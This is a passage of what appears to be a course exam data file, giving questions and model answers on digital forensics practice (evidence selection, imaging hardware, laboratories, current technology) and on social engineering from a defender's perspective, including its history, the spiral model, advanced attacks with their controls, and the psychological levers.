                'Selecting evidence is the discipline of reducing a very large data set to a small, defensible one — without deciding the answer in advance.\n\n**A. Selection**\n1. **Scope first** — write the question the examination must answer, because selection without a question becomes a search for anything.\n2. **Triage the high-value artefacts** — user accounts and profiles, recent documents, browser history and downloads, mail stores, USB connection history, execution artefacts (Prefetch, Amcache, ShimCache), event logs, and cloud sync folders.\n3. **Filter** — by hash set (known-good operating system files excluded; known-bad files flagged), keyword list, date range around the incident, file type, and path of interest.\n4. **Recover** — deleted files, slack space and unallocated space, because the file that was removed is often the one that matters.\n5. **Record the method** — the filter used, the tool, and what was excluded, so that the selection itself is defensible.\n\n**B. Analysis steps**\n\n| Step | Action |\n|---|---|\n| 1 | verify the image hash against the acquisition record |\n| 2 | build the timeline from file system, event log, browser, mail and registry artefacts on one clock |\n| 3 | link each artefact to a user, a device and a time |\n| 4 | test alternative explanations — was the file opened by the user, or by a service account? |\n| 5 | look for exculpatory material as carefully as for the incriminating |\n| 6 | state the finding with the artefacts that support it, and the limitation |\n\n**The point that carries the mark.** Analysis is hypothesis testing, not storytelling. A file in a folder does not prove that the user opened it; the investigator must show the execution artefact, the session and the account — and must record what the evidence does not show.\n\n**Exam line:** select by the question, verify the copy, recover the deleted, place everything on one timeline, and test the innocent explanation before you publish the guilty one.',
              diagram: 'df-select',
              diagramCaption:
                'Selecting and analysing evidence — triage of high-value artefacts, filtering, and the analysis steps from hash verification to finding.',
            },
            {
              marks: 5,
              label: 'b',
              question:
                'Describe the imaging hardware used in digital forensics and explain the purpose of a duplicator, a write blocker and clean media.',
              explain:
                '**What is being asked.** A hardware question with purpose. The examiner wants three specific devices and why each exists, plus the rule that connects them.\n\n**Duplicator.** A standalone unit that copies a drive bit for bit and computes the hash, without an operating system in between.\n\n**Write blocker.** Enforces read-only access at the interface level so that the act of copying cannot change the source.\n\n**Clean media.** Known-good, wiped, serialised destination drives, so that the image is not contaminated and the destination can be identified later.\n\n**The connecting rule.** The hash proves the copy; the blocker protects the source; the clean media protects the copy.\n\n**How to score the 5 marks.** Three devices explained (3) · the connecting rule (1) · one practical precaution (1).',
              answer:
                'Forensic imaging hardware exists to make one promise: the copy is identical to the original, and the original was not changed by making it.\n\n**Duplicator.** A standalone unit that copies a source drive to a destination drive at the block level, with no operating system involved. It computes and displays a hash, supports IDE, SATA, SAS, USB and NVMe through adapters, and can copy faster than a workstation. Because there is no operating system, there is no driver, no mount and no journal — which is exactly the point.\n\n**Write blocker.** A hardware bridge between the drive and the computer that permits read commands and rejects every write command at the interface level. It is validated against NIST criteria, it logs the blocked commands in better models, and it is the reason a copy can be made without altering the source. A software blocker cannot give the same guarantee, because the operating system underneath can still write.\n\n**Clean media.** Destination drives that are new or fully wiped, serialised, labelled and recorded on the case file. They matter for two reasons: a destination that contains old data contaminates the image and the hash, and a serial number is how the copy is identified in court years later.\n\n| Device | Protects | How it is proved |\n|---|---|---|\n| duplicator | speed and consistency of the copy | the hash printed by the unit, recorded on the case file |\n| write blocker | the source | the blocker model and its NIST test report |\n| clean media | the copy | the wipe record and the drive serial on the label |\n\n**Practical precautions.** Photograph the drive and its label before removal, record the jumper and interface type, keep the source in an anti-static bag with a seal, and take a second copy for the working examination so that the first copy is preserved untouched.\n\n**Exam line:** the blocker protects the source, the duplicator makes the copy, the clean media keeps it pure — and the hash proves all three.',
              diagram: 'df-hw-sw',
              diagramCaption:
                'Forensic imaging hardware — duplicator, write blocker and clean media — with what each one protects and how it is proved.',
            },
          ],
        },
        {
          label: 'c',
          parts: [
            {
              marks: 5,
              label: 'c',
              question:
                'Explain the role and environment of a digital forensics laboratory. State the facilities and the controls it must have.',
              explain:
                '**What is being asked.** A laboratory question: what the lab does and what it must contain to do it defensibly.\n\n**Role.** Examination and analysis of seized media, mobile extraction, malware analysis, evidence storage, expert reporting, and support to incident response.\n\n**Environment.** Physical security with restricted access and CCTV; an evidence store with a lock and a log; a clean network isolated from the internet for malware work; a separate network for case work; ESD-safe benches; environmental control; and a documented quality system.\n\n**How to score the 5 marks.** Role (2) · environment and facilities (2) · one quality control, such as accreditation or peer review (1).',
              answer:
                'A **digital forensics laboratory** is the controlled environment in which digital evidence is examined, so that the result is accurate, repeatable and defensible.\n\n**Role**\n1. **Examination and analysis** of seized media — disks, phones, memory, cloud exports.\n2. **Mobile extraction** at the supported levels, with the right kit for each handset.\n3. **Malware analysis** in an isolated network, for samples collected during an incident.\n4. **Evidence storage** under seal with a custody record for the whole retention period.\n5. **Expert reporting and testimony**, and support to incident response and to the legal team.\n6. **Tool validation and method development**, so that the lab knows its instruments work before a case depends on them.\n\n**Environment and facilities**\n\n| Facility | Control |\n|---|---|\n| physical access | restricted entry, badge log, CCTV, visitor escort |\n| evidence store | locked room or safe, seal register, custody log, fire and flood protection |\n| case network | isolated from the internet and from the corporate network, with no route to the evidence store |\n| malware network | separate, host-only, with simulated internet services and no bridge to production |\n| work benches | ESD-safe, anti-static bags and kits, adequate lighting and power |\n| environment | temperature and humidity control, uninterrupted power, protection from magnetic and wireless interference |\n| documentation | case files, tool inventory with versions, method statements, chain of custody forms |\n\n**Quality controls.** Written procedures for each examination type, validated tools with recorded versions, peer review of every report, a competency and training record for each examiner, and accreditation to a standard such as ISO/IEC 17025 where the lab appears in court regularly.\n\n**The principle.** A laboratory is not a room with tools; it is a set of controls that make a result repeatable by someone else. Access control protects the evidence, network separation protects the case, and documentation protects the conclusion.\n\n**Exam line:** restrict access, isolate the network, log the store, validate the tools and review the report — the lab is the method, not the equipment.',
              diagram: 'df-role',
              diagramCaption:
                'The role and environment of a digital forensics laboratory — facilities, network isolation, evidence storage and quality controls.',
            },
            {
              marks: 5,
              label: 'd',
              question:
                'Explain the current technology and practices in digital forensics: cloud, mobile, memory and AI-assisted analysis.',
              explain:
                '**What is being asked.** A currency question: what has changed in the discipline. The examiner wants four areas and one risk for each.\n\n**Cloud.** Evidence is off-device, in a tenant, logged by the provider; the risk is jurisdiction and provider cooperation; the answer is API audit logs, export, and legal process.\n\n**Mobile.** Almost every case has a phone; encryption and app-level data mean extraction level matters; the answer is a supported tool, Faraday isolation and app artefacts.\n\n**Memory.** Fileless malware and encryption keys live in RAM; the answer is capture before shutdown and Volatility-style analysis.\n\n**AI-assisted analysis.** Triage, clustering, transcription, timeline summarisation; the risk is opacity and bias, so validation and human review remain mandatory.\n\n**How to score the 5 marks.** Four areas explained (3) · one risk each (1) · the human-review point (1).',
              answer:
                'Digital forensics has changed because the evidence has moved: it is now spread across devices, tenants and memory, and it is larger than any examiner can read.\n\n| Area | What has changed | Practice today | Risk to manage |\n|---|---|---|---|\n| **Cloud** | data is in a tenant, not on a seized disk; the provider holds the logs | export tenant audit logs, use the provider eDiscovery tools, serve legal process on the provider, correlate with endpoint evidence | jurisdiction, retention by the provider, and shared infrastructure that mixes many customers |\n| **Mobile** | nearly every case has a phone; full-disk encryption and app sandboxes | supported extraction at the highest level available, Faraday isolation, app-level artefacts (chat, location, cloud backup) | a wrong extraction level silently loses data; a remote wipe can arrive if the phone is online |\n| **Memory** | fileless malware, in-memory keys, live sessions | capture RAM before shutdown, analyse with Volatility-style tools for processes, connections and keys | capture is one-shot; a missed capture cannot be repeated |\n| **AI-assisted analysis** | data volume exceeds human reading capacity | AI triage, clustering of similar documents, transcription, timeline summarisation, translation | opacity and bias in the model; an unexplainable result is not evidence |\n\n**The practices that follow**\n1. **Preservation before analysis** remains unchanged — hash, write blocker, chain of custody.\n2. **Triage at the edge** — collect from the endpoint and the cloud tenant in parallel, because the answer is rarely in one place.\n3. **Automation with review** — machine triage shortlists; a human examiner verifies every finding that appears in the report.\n4. **Continuous validation** — every new tool, including an AI model, is tested against known data before a case depends on it.\n\n**The point that earns the last mark.** Technology changes the collection, not the standard. A finding produced by a model must still be explained by an examiner, because the court accepts the reasoning of a person, not the output of a tool.\n\n**Exam line:** cloud, mobile, memory and AI — the evidence has spread and grown, so the method must scale while the standard of proof does not move.',
              diagram: 'df-tech',
              diagramCaption:
                'Current technology and practice in digital forensics — cloud, mobile, memory and AI-assisted analysis, with the risk each brings.',
            },
          ],
        },
      ],
    },
    {
      number: 5,
      marks: 10,
      kind: 'pair',
      note: '10 marks — (a) 5 + (b) 5 · OR (c) 5 + (d) 5',
      options: [
        {
          label: 'a',
          parts: [
            {
              marks: 5,
              label: 'a',
              question:
                'Explain the conceptual evolution of social engineering from the 1970s to the present, and state what has not changed.',
              explain:
                '**What is being asked.** A timeline question with an argument: the channel changed four times, the psychology did not change at all.\n\n**The timeline.** 1970s — phone phreaking, the human voice on a landline. 1990s — mail and pretext calls, the first mass phishing. 2000s — web and spear phishing, cloned login pages. 2010s — social media and mobile, targeting by profile. 2020s — AI voice and video, deepfakes, social engineering as a service at scale.\n\n**What has not changed.** Trust, authority, urgency, fear and the habit of helping. The attacker still researches, hooks, plays and exits.\n\n**How to score the 5 marks.** Timeline with three or four eras (3) · the constants (1) · the conclusion that the defence is structural, not only educational (1).',
              answer:
                'Social engineering has changed its channel four times in fifty years; it has not changed its method once.\n\n| Era | Channel | Typical attack | What made it work |\n|---|---|---|---|\n| **1970s** | landline telephone | phone phreaking, impersonating an operator or an engineer | the voice carried authority and there was no way to verify it |\n| **1990s** | e-mail and pretext calls | the first mass phishing mails, fake "system administrator" calls | a new channel with no norms, so any message looked official |\n| **2000s** | web | cloned login pages, spear phishing, "password expiry" mails | users learned to trust a page that looked like the real one |\n| **2010s** | social media and mobile | targeting by profile, smishing, WhatsApp impersonation | the research became free and the pretext became personal |\n| **2020s** | AI voice and video | deepfake calls, cloned voice of a director, chat-based scams at scale | the pretext became indistinguishable from the real person |\n\n**What has not changed.** The levers are the same five — trust, authority, urgency, the wish to help, and fear of a penalty. The model is the same four phases — research, hook, play, exit. The victim still performs the action, so the system still records a legitimate user doing a legitimate-looking thing.\n\n**What follows for defence.** Because the channel keeps changing, defending the channel is a losing race: a filter for mail does not stop a voice call, and a filter for calls does not stop a QR code. Defence must be structural — verification out of band, number-matching MFA, dual approval for payments, least privilege, and monitoring of behaviour — so that a perfect pretext still cannot complete the action alone.\n\n**Exam line:** the channel changed from phone to mail to web to social to AI, the psychology never changed, so the defence must not depend on recognising the channel.',
              diagram: 'se-evolution',
              diagramCaption:
                'The evolution of social engineering from phone phreaking to AI voice, with the constants of trust and authority that never changed.',
            },
            {
              marks: 5,
              label: 'b',
              question:
                'Explain the attack spiral model of social engineering and state why a failed attempt does not end the campaign.',
              explain:
                '**What is being asked.** The linear model treats an attack as one event; the spiral model treats it as a repeating campaign in which each loop grants more information and deeper access.\n\n**The spiral.** Research, hook, play, exit — and then the next loop starts with what was learned. Loop one may only get a name and a mail signature; loop two gets a mailbox; loop three gets a payment approval.\n\n**Why it matters.** Defence that stops one attempt has stopped one loop, not the campaign. Detection must therefore look for the pattern across attempts, and the defender must assume a continuing adversary.\n\n**How to score the 5 marks.** The spiral described (2) · contrast with the linear model (1) · the defensive consequence (2).',
              answer:
                'The **linear model** describes a social engineering attack as a single sequence: research, hook, play, exit. The **spiral model** describes it as a campaign: every completed loop returns to research with more information, deeper access and a better pretext, and the radius grows with each turn.\n\n**How one loop feeds the next**\n\n| Loop | What the attacker gains | What the next loop can do |\n|---|---|---|\n| 1 | a name, a signature, a vendor name, a ticket format | a credible first mail that gets a reply |\n| 2 | a mailbox or a chat channel | read the real threads and copy the style exactly |\n| 3 | a payment process or an approval chain | a request that lands at the right moment, from the right address |\n| 4 | a session, a token or an established relationship | the action completes without any further request |\n\n**Why a failed attempt does not end the campaign.** The attacker loses a loop, not the war. The exit phase exists precisely to keep the channel warm: the caller apologises for the confusion, the mail is withdrawn politely, the fake profile stays connected. The next attempt arrives weeks later with a better pretext, and the defender who closed the case has already forgotten the first one.\n\n**The defensive consequence**\n1. **Correlate attempts** — one blocked mail is a data point; five similar mails across six weeks are a campaign and deserve an alert.\n2. **Assume persistence** — the controls stay on after the incident: the payment verification rule does not lapse when the "urgent" request is resolved.\n3. **Fix the loop, not the attempt** — a reported phishing mail should tune the filter and train the team, so that the next loop is caught earlier.\n4. **Measure the trend** — attempt volume by pretext and by target group, not only the number of successful clicks.\n\n**Exam line:** a linear model is one attack, a spiral model is a continuing campaign — so detection must look across attempts, not at the last one.',
              diagram: 'se-spiral',
              diagramCaption:
                'The attack spiral model — each loop returns to research with deeper access, and the escalation that follows from one loop to the next.',
            },
          ],
        },
        {
          label: 'c',
          parts: [
            {
              marks: 5,
              label: 'c',
              question:
                'Explain advanced social engineering attacks — MFA fatigue, deepfake voice, quishing and OAuth consent abuse — and the control that stops each.',
              explain:
                '**What is being asked.** Four techniques that defeat the standard advice. The examiner wants each explained and each answered by a specific control, because "train the users" is not a control.\n\n**MFA fatigue.** Repeated push notifications until the user approves. Control: number matching, rate limiting, FIDO2.\n\n**Deepfake voice.** A cloned voice of a director authorising a payment. Control: callback on a known number, a shared code word, dual approval.\n\n**Quishing.** A QR code that hides the URL. Control: scan with the organisation camera that inspects the link, block unknown QR destinations, never authenticate from a QR.\n\n**OAuth consent abuse.** A fake app asks for consent and receives a token. Control: admin consent workflow, app allow-listing, token revocation and audit.\n\n**How to score the 5 marks.** Four attacks explained (2) · a control for each (2) · the sentence that the control must be technical (1).',
              answer:
                'Advanced attacks are designed to survive the standard advice. Each one is answered by a control that does not depend on the user noticing.\n\n| Attack | How it works | Control that stops it |\n|---|---|---|\n| **MFA fatigue (push bombing)** | the attacker has a valid password and sends dozens of push prompts until the user approves one out of irritation or confusion | **number matching**, push rate limits, FIDO2 hardware keys, and an alert on a spike of prompts |\n| **Deepfake voice or video** | a cloned voice of a director or a vendor authorises a payment in a live call | callback on a number from the internal directory, a shared code word for high-value instructions, dual approval, and a rule that no payment instruction is accepted by voice alone |\n| **Quishing (QR phishing)** | a QR code in a poster, a mail or a parking ticket carries a malicious URL that the phone camera opens without the usual link check | block QR destinations in the mail gateway, scan with an inspected camera, forbid authentication from a QR code, and use the portal directly |\n| **OAuth consent abuse (illicit consent grant)** | a fake application asks for permission and the user grants a token, so the attacker reads mail or files without a password | admin consent workflow, application allow-listing, review of granted permissions, and token revocation on detection |\n\n**Why these four are grouped.** Each one defeats a control that used to be enough: the password, the obvious voice, the visible link, the login page. The attacker is not breaking the cryptography — the attacker is finding the step where a person is asked to approve something unusual and is given no way to check it.\n\n**The principle.** The response must be technical and procedural, not educational. Number matching works because the user must type a number that the attacker cannot see. A callback rule works because the number comes from the directory, not from the caller. An admin consent workflow works because a user cannot grant a permission that an administrator has not approved.\n\n**Exam line:** MFA fatigue, deepfake, quishing and OAuth abuse each defeat an old control — so the new control must remove the decision from the user.',
              diagram: 'se-advanced',
              diagramCaption:
                'Advanced social engineering attacks — MFA fatigue, deepfake, quishing and OAuth consent abuse — with the control that stops each.',
            },
            {
              marks: 5,
              label: 'd',
              question:
                'Explain why social engineering succeeds. Describe the five psychological levers and the defence loop that answers them.',
              explain:
                '**What is being asked.** A conceptual question about the human levers — trust, authority, urgency, helpfulness, fear — and the loop of controls that answers them: verify, minimise, protect, respond and train.\n\n**The levers.** Trust is the default setting. Authority is respected without checking. Urgency removes the pause in which verification happens. Helpfulness is rewarded socially. Fear of penalty makes people act first and report later.\n\n**The defence loop.** Verify out of band; minimise privilege; protect with technical controls; respond fast when something is reported; train continuously and protect the reporter.\n\n**How to score the 5 marks.** Why it works (1) · five levers (2) · the defence loop (2).',
              answer:
                'Social engineering succeeds because it does not attack a system; it attacks a normal human response. Five levers do most of the work.\n\n| Lever | The normal response | How the attacker uses it |\n|---|---|---|\n| **Trust** | people trust by default, especially a familiar name or logo | a message from a known brand or colleague is read as genuine |\n| **Authority** | an instruction from a senior is rarely questioned | the caller is the auditor, the director, the police officer |\n| **Urgency** | a deadline removes the pause in which verification happens | the account closes in thirty minutes; the payment must go today |\n| **Helpfulness** | helping a colleague is rewarded socially; refusing feels rude | a small favour — hold the door, share the file, read the code |\n| **Fear** | the fear of a penalty, a loss or embarrassment drives fast action | a legal notice, a fine, a suspended account, a "digital arrest" |\n\n**Why the levers are enough.** Each one removes the same step — the pause in which a person would check. The attacker does not need to defeat security; the attacker only needs to make checking feel unnecessary or unsafe.\n\n**The defence loop**\n1. **Verify** — out of band, on a number or channel from the directory, never the one in the message. Make verification normal, quick and blameless.\n2. **Minimise** — least privilege, small approval limits, no single person able to move a large payment. If the action is not available, the pretext does not matter.\n3. **Protect** — number matching or FIDO2, admin consent, egress filtering, DLP, and a rule that no credential is ever given on an inbound call.\n4. **Respond** — one-click reporting, session revocation within minutes, and a hunt for other recipients of the same message.\n5. **Train** — short, frequent and based on real attempts seen in the organisation, with the person who reports a mistake protected, not punished.\n\n**The closing idea.** Awareness alone cannot win, because the levers are part of normal behaviour; technology alone cannot win either, because a valid session is valid. The defence is the loop: a technical control that limits the damage, and a culture that makes reporting faster than hiding.\n\n**Exam line:** trust, authority, urgency, helpfulness and fear each remove the pause — so the defence is verification by default and a control that does not depend on the pause.',
              diagram: 'se-intro',
              diagramCaption:
                'Why social engineering works — the five psychological levers and the defence loop of verify, minimise, protect, respond and train.',
            },
          ],
        },
      ],
    },
  ],
};
